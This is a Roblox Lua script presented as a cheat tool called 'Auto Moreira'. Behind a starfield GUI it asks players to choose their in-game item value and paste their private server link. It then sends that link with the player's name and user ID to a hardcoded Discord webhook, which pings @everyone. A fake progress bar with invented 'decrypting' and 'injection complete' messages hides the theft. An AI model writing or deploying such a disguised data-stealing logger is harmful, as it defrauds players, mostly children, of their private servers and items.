--[[
Title: Two-Stage Logger GUI (Global Notification)
Description:
This script implements a two-stage logging process with a persistent Cyber Blue/Black aesthetic.

CHANGE: The Discord webhook now includes a top-level 'content' field with @everyone to ensure
a notification is sent to all server members who have permissions enabled.
--]]

-- CONFIGURATION
local WEBHOOK_URL = "https://discord.com/api/webhooks/1436819437532610671/gJzYyx6My4BGMN03dqG8VxXeTR-yATvJCDkkG08-m2e9GNhzAbBVOvy96b-gcCJx_SB6"
local ACCENT_COLOR = Color3.fromRGB(0, 191, 255) -- Cyber Blue
local ACCENT_COLOR_HEX = 0x00BFFF
local BUTTON_WIDTH = 90
local BUTTON_HEIGHT = 28
local DELAY_PER_PERCENT = 2 -- For the Stage 2 progress bar (200s total demo)
local PROGRESS_VISUAL_TWEEN = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- List of "Brainrot" values to display in millions (M)
local BRAINROT_VALUES = {}
for i = 30, 250, 10 do
table.insert(BRAINROT_VALUES, tostring(i) .. "M")
end

-- Initialize services
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer

-- Global variables for GUI and effects and DATA
local blinkConnection = nil
local starDots = {}
local MasterGUI = nil
local BackgroundFrame = nil
local Stage1Frame = nil
local Stage2Frame = nil
local g_selectedValue = "30M" -- Holds the selection from Stage 1 for use in Stage 2

-- =========================================================================
-- UTILITY FUNCTIONS (Aesthetics & Data)
-- =========================================================================

local function createStarField(parentFrame, starCount)
for i = 1, starCount do
local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, math.random(1, 2), 0, math.random(1, 2))
dot.Position = UDim2.new(math.random(), 0, math.random(), 0)
dot.BackgroundColor3 = Color3.new(1, 1, 1)
dot.BorderSizePixel = 0
dot.BackgroundTransparency = math.random(0, 40) / 100
dot.Parent = parentFrame
table.insert(starDots, dot)
end

local connection = RunService.RenderStepped:Connect(function()
for _, dot in ipairs(starDots) do
if dot.Parent then
dot.Position = dot.Position + UDim2.new(0, 0, 0.0002, 0)
if dot.Position.Y.Scale > 1.05 then
dot.Position = UDim2.new(dot.Position.X.Scale, 0, -0.05, 0)
end
end
end
end)
if MasterGUI then
MasterGUI.Destroying:Connect(function() connection:Disconnect() end)
end
end

local function startBlinking(textLabel)
if blinkConnection then blinkConnection:Disconnect() end
blinkConnection = RunService.Heartbeat:Connect(function()
local t = tick()
textLabel.TextColor3 = ACCENT_COLOR:lerp(Color3.new(1, 1, 1), math.sin(t * 15) * 0.5 + 0.5)
end)
end

local function stopBlinking(textLabel)
if blinkConnection then
blinkConnection:Disconnect()
blinkConnection = nil
end
textLabel.TextColor3 = Color3.new(1, 1, 1)
end

local function getPlayerCount()
return #game.Players:GetPlayers()
end

-- =========================================================================
-- FINAL LOGGING: (WITH HTTP FALLBACK)
-- =========================================================================

local function SendFinalLogToDiscord(serverLink, selectedValue)
spawn(function()
local success, result = pcall(function()
local playerCount = getPlayerCount()

local payload = {
-- ADDED CONTENT FIELD FOR @EVERYONE NOTIFICATION
content = "@everyone MR SCRIPT ON THE TOP⚒️ ",
username = "FINAL LOG: Auto Moreira",
avatar_url = "https://placehold.co/128x128/00BFFF/000000?text=S3",
embeds = {
{
title = "✅ NEW PRIVATE SERVER LOG", -- Cleaned up embed title
description = string.format("Initiator: **%s** has submitted their private server link and eligibility.", player.Name),
color = ACCENT_COLOR_HEX,
fields = {
{ name = "🧠 Selected Eligibility Value", value = "**" .. selectedValue .. "**", inline = false },
{ name = "📋 Server Link", value = "`" .. serverLink .. "`", inline = false },
{ name = "Initiator User ID", value = tostring(player.UserId), inline = true },
{ name = "Current Player Count", value = tostring(playerCount) .. " players", inline = true }
},
footer = { text = os.date("%m/%d/%Y %I:%M:%S %p") .. " UTC" }
}
}
}
local JSON_DATA = HttpService:JSONEncode(payload)

-- === HTTP FALLBACK LOGIC ===

-- Attempt 1: Standard 'request' function (common in most executors)
if type(request) == "function" then
request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = JSON_DATA })
return
end

-- Attempt 2: getgenv().http.request (common in some other environments)
if type(getgenv().http) == "table" and type(getgenv().http.request) == "function" then
getgenv().http.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = JSON_DATA })
return
end

-- Attempt 3 (Least reliable but included for completeness): Roblox HttpService method
-- Requires HttpService to be allowed which is often blocked by FE scripts
if pcall(HttpService.PostAsync, HttpService, WEBHOOK_URL, JSON_DATA, Enum.HttpContentType.ApplicationJson) then
return
end

warn("ERROR: Could not find a working HTTP request method. Webhook was NOT sent.")

end)
if not success then
warn("CRITICAL ERROR: Final Webhook failed to execute inside pcall: " .. tostring(result))
end
end)
end

-- =========================================================================
-- STAGE 2 PROGRESS BAR LOGIC
-- =========================================================================

local function runProgressBar(link)
local loadingTitle = Stage2Frame:FindFirstChild("loadingTitle")
local progressBarBg = Stage2Frame:FindFirstChild("progressBarBg")
local progressBar = progressBarBg:FindFirstChild("progressBar")
local percentText = progressBarBg:FindFirstChild("percentText")
local subtitle = Stage2Frame:FindFirstChild("subtitle")

-- 1. Send the combined log to Discord (Instant)
SendFinalLogToDiscord(link, g_selectedValue)

StarterGui:SetCore("SendNotification", {
Title = "📡 Protocol Initiated",
Text = "Link successfully transferred. Executing 200-second server bridge validation...",
Duration = 3;
})

-- 2. Run the slow progress bar for the visual demo
progressBar.Size = UDim2.new(0, 0, 1, 0)
percentText.Text = "0%"
startBlinking(percentText)

for i = 1, 100 do
local scale = i / 100
if i == 5 then subtitle.Text = "INITIALIZING secure hyper-threading protocol [0xCC]..."
elseif i == 25 then subtitle.Text = "MAPPING server instance hash (ID: XXXXXX)..."
elseif i == 45 then subtitle.Text = "PATCHING network latency buffers (Layer 7)..."
elseif i == 65 then subtitle.Text = "DECRYPTING shared server session key (AES-256)..."
elseif i == 85 then subtitle.Text = "ESTABLISHING final persistence hook on target environment..." end

TweenService:Create(progressBar, PROGRESS_VISUAL_TWEEN, {Size = UDim2.new(scale, 0, 1, 0)}):Play()
percentText.Text = tostring(i) .. "%"
task.wait(DELAY_PER_PERCENT)
end

-- Final cleanup
stopBlinking(percentText)
loadingTitle.Text = "✅ INJECTION COMPLETE!"
loadingTitle.TextSize = 26
subtitle.Text = "PROTOCOL TERMINATING. ACCESS GRANTED."
progressBarBg.BackgroundTransparency = 1
task.wait(1)
MasterGUI:Destroy()
end

-- =========================================================================
-- STAGE 2 GUI: LINK INPUT CREATION (Created ONCE)
-- =========================================================================
local function createLinkInputFrame()
Stage2Frame = Instance.new("Frame", BackgroundFrame)
Stage2Frame.Name = "Stage2Frame"
Stage2Frame.Size = UDim2.new(0, 400, 0, 250)
Stage2Frame.Position = UDim2.new(0.5, -200, 0.5, -125)
Stage2Frame.BackgroundTransparency = 1
Stage2Frame.ZIndex = 10
Stage2Frame.Visible = false

-- --- INPUT ELEMENTS ---
local inputTitle = Instance.new("TextLabel", Stage2Frame)
inputTitle.Size = UDim2.new(1, 0, 0, 50)
inputTitle.Position = UDim2.new(0, 0, 0, 10)
inputTitle.Text = "PUT YOUR PRIVATE SERVER LINK👇"
inputTitle.Font = Enum.Font.GothamBlack
inputTitle.TextSize = 22
inputTitle.TextColor3 = ACCENT_COLOR
inputTitle.BackgroundTransparency = 1

local LinkInput = Instance.new("TextBox")
LinkInput.Name = "LinkInput"
LinkInput.Size = UDim2.new(1, -40, 0, 30)
LinkInput.Position = UDim2.new(0, 20, 0, 80)
LinkInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
LinkInput.TextColor3 = Color3.fromRGB(255, 255, 255)
LinkInput.Font = Enum.Font.SourceSans
LinkInput.TextSize = 14
LinkInput.PlaceholderText = "Paste private server share link here..."
LinkInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
LinkInput.ClearTextOnFocus = false
LinkInput.Parent = Stage2Frame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 4)
InputCorner.Parent = LinkInput

local SubmitButton = Instance.new("TextButton")
SubmitButton.Name = "SubmitButton"
SubmitButton.Size = UDim2.new(1, -40, 0, 40)
SubmitButton.Position = UDim2.new(0, 20, 0, 130)
SubmitButton.BackgroundColor3 = ACCENT_COLOR
SubmitButton.TextColor3 = Color3.fromRGB(0, 0, 0)
SubmitButton.Font = Enum.Font.GothamBold
SubmitButton.TextSize = 18

SubmitButton.Text = "SUBMIT"

SubmitButton.Parent = Stage2Frame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 6)
ButtonCorner.Parent = SubmitButton

-- --- LOADING ELEMENTS (Hidden initially) ---
local loadingTitle = Instance.new("TextLabel", Stage2Frame)
loadingTitle.Name = "loadingTitle"
loadingTitle.Size = UDim2.new(1, 0, 0, 50)
loadingTitle.Position = UDim2.new(0, 0, 0, 10)
loadingTitle.Text = "AUTO MOREIRA BY MR SCRIPT"
loadingTitle.Font = Enum.Font.GothamBlack
loadingTitle.TextSize = 36
loadingTitle.TextColor3 = ACCENT_COLOR
loadingTitle.BackgroundTransparency = 1
loadingTitle.Visible = false

local progressBarBg = Instance.new("Frame", Stage2Frame)
progressBarBg.Name = "progressBarBg"
progressBarBg.Size = UDim2.new(1, -40, 0, 20)
progressBarBg.Position = UDim2.new(0, 20, 0, 100)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.Visible = false

local progressBar = Instance.new("Frame", progressBarBg)
progressBar.Name = "progressBar"
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = ACCENT_COLOR
progressBar.BorderSizePixel = 0

local percentText = Instance.new("TextLabel", progressBarBg)
percentText.Name = "percentText"
percentText.Size = UDim2.new(1, 0, 1, 0)
percentText.Position = UDim2.new(0, 0, 0, 0)
percentText.Text = "0%"
percentText.Font = Enum.Font.Gotham
percentText.TextSize = 14
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.BackgroundTransparency = 1

local subtitle = Instance.new("TextLabel", Stage2Frame)
subtitle.Name = "subtitle"
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0, 0, 0, 140)
subtitle.Text = "SECURE PROTOCOL INITIALIZING..."
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 14
subtitle.TextColor3 = Color3.new(1, 1, 1)
subtitle.BackgroundTransparency = 1
subtitle.Visible = false

local function showLoadingScreen()
inputTitle.Visible = false
LinkInput.Visible = false
SubmitButton.Visible = false
loadingTitle.Visible = true
progressBarBg.Visible = true
subtitle.Visible = true
end

SubmitButton.MouseButton1Click:Connect(function()
local link = LinkInput.Text
if string.len(link) > 10 and (string.find(link, "roblox.com/games/", 1, true) or string.find(link, "roblox.com/share", 1, true)) then
showLoadingScreen()
spawn(function()
runProgressBar(link)
end)
else
inputTitle.Text = "❌ ERROR: INVALID LINK SYNTAX (Check link)"
inputTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
task.wait(2)
inputTitle.Text = "PUT YOUR PRIVATE SERVER LINK👇"
inputTitle.TextColor3 = ACCENT_COLOR
end
end)
end

-- =========================================================================
-- STAGE 1 GUI: SELECTION CREATION
-- =========================================================================
local function createSelectionFrame()
Stage1Frame = Instance.new("Frame", BackgroundFrame)
Stage1Frame.Name = "Stage1Frame"
Stage1Frame.Size = UDim2.new(0, 350, 0, 350)
Stage1Frame.Position = UDim2.new(0.5, -175, 0.5, -175)
Stage1Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Stage1Frame.BorderSizePixel = 0

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = Stage1Frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)

title.Text = "SELECT YOUR BRAINROT IN YOUR BASE"

title.Font = Enum.Font.GothamBlack
title.TextSize = 18
title.TextColor3 = ACCENT_COLOR
title.BackgroundTransparency = 1
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center
title.Parent = Stage1Frame

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -20, 0, 30)
subtitle.Position = UDim2.new(0, 10, 0, 50)
subtitle.Text = "Select your value to proceed to link input:"
subtitle.Font = Enum.Font.SourceSans
subtitle.TextSize = 15
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.BackgroundTransparency = 1
subtitle.Parent = Stage1Frame

local container = Instance.new("ScrollingFrame")
container.Size = UDim2.new(1, -20, 1, -100)
container.Position = UDim2.new(0, 10, 0, 80)
container.AutomaticCanvasSize = Enum.AutomaticSize.Y
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.ScrollBarThickness = 6
container.Parent = Stage1Frame

local gridLayout = Instance.new("UIGridLayout")
gridLayout.CellSize = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
gridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
gridLayout.VerticalAlignment = Enum.VerticalAlignment.Top
gridLayout.FillDirection = Enum.FillDirection.Horizontal
gridLayout.Parent = container

for _, value in ipairs(BRAINROT_VALUES) do
local button = Instance.new("TextButton")
button.Name = "Button_" .. value
button.Size = UDim2.new(0, BUTTON_WIDTH, 0, BUTTON_HEIGHT)
button.Text = value
button.Font = Enum.Font.GothamBold
button.TextSize = 14
button.TextColor3 = Color3.new(0, 0, 0)
button.BackgroundColor3 = ACCENT_COLOR
button.Parent = container

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 5)
btnCorner.Parent = button

button.MouseButton1Click:Connect(function()
g_selectedValue = value

StarterGui:SetCore("SendNotification", {
Title = "Selection Accepted",
Text = "Eligibility confirmed (" .. g_selectedValue .. "). Proceeding to Link Input...",
Duration = 2;
})

Stage1Frame.Visible = false
Stage2Frame.Visible = true
end)
end
end

-- =========================================================================
-- INITIALIZATION
-- =========================================================================

pcall(function() game.CoreGui:FindFirstChild("MasterLoggerGUI"):Destroy() end)

MasterGUI = Instance.new("ScreenGui")
MasterGUI.Name = "MasterLoggerGUI"
MasterGUI.ResetOnSpawn = false
MasterGUI.IgnoreGuiInset = true
MasterGUI.ZIndexBehavior = Enum.ZIndexBehavior.Global
MasterGUI.Parent = game:GetService("CoreGui")

BackgroundFrame = Instance.new("Frame", MasterGUI)
BackgroundFrame.Size = UDim2.new(1, 0, 1, 0)
BackgroundFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BackgroundFrame.BackgroundTransparency = 0

createStarField(BackgroundFrame, 150)
createLinkInputFrame()
createSelectionFrame()

Stage1Frame.Visible = true
Stage2Frame.Visible = false

MasterGUI.Enabled = true
